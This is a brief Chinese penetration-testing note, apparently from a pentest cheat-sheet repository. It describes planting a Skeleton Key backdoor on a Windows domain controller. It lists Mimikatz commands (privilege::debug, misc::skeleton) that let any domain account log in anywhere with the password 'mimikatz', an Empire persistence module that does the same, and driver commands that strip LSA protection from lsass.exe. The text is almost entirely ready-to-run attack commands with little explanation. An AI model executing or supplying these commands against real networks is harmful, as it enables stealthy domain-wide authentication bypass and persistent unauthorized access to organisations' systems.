	域控上使用mimikatz执行
	>privilege::debug
	>misc::skeleton
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/567.png)

	可以使用域内任何账号以密码mimikatz登录任意域内主机
	使用Empire模块
	>usemodule persistence/misc/skeleton_key*
	绕过LSA Protection
	>privilege::debug
	>!+
	>!processprotect /process:lsass.exe /remove
	>misc::skeleton